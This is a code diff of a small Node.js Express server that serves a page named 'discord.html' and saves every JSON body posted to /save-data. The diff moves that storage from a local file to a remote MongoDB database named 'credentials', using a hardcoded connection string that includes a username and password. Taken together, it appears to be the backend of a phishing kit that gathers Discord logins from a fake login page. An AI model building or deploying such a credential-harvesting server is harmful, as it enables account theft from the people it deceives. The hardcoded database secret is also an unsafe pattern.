@@ -1,38 +1,38 @@
 const express = require("express");
-const fs = require("fs");
-const path = require("path");
 const bodyParser = require("body-parser");
+const { MongoClient } = require("mongodb");
+const path = require("path");
+
 const app = express();
 const port = 4200;
 
 app.use(bodyParser.json());
-
 app.use(express.static("public"));
+
+const uri = "mongodb+srv://copy:hehelol@@credentials.pxrplms.mongodb.net/?retryWrites=true&w=majority&appName=credentials";
+const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
 
 app.get("/", (req, res) => {
 	res.sendFile(path.join(__dirname, "public", "discord.html"));
 });
 
-app.post("/save-data", (req, res) => {
-	const data = req.body;
-	const filePath = path.join(__dirname, "meow.json");
+app.post("/save-data", async (req, res) => {
+	try {
+		await client.connect();
+		const database = client.db("credentials");
+		const collection = database.collection("data");
 
-	fs.readFile(filePath, "utf8", (err, fileData) => {
-		let jsonData = [];
+		const data = req.body;
 
-		if (!err && fileData) {
-			jsonData = JSON.parse(fileData);
-		}
-		jsonData.push(data);
-		fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), "utf8", (err) => {
-			if (err) {
-				console.error("Error writing to file:", err);
-				res.status(500).send("Error saving data");
-			} else {
-				res.send("Data saved successfully");
-			}
-		});
-	});
+		await collection.insertOne(data);
+
+		res.send("Data saved successfully");
+	} catch (err) {
+		console.error("Error saving data to MongoDB:", err);
+		res.status(500).send("Error saving data");
+	} finally {
+		await client.close();
+	}
 });
 
 app.listen(port, () => {
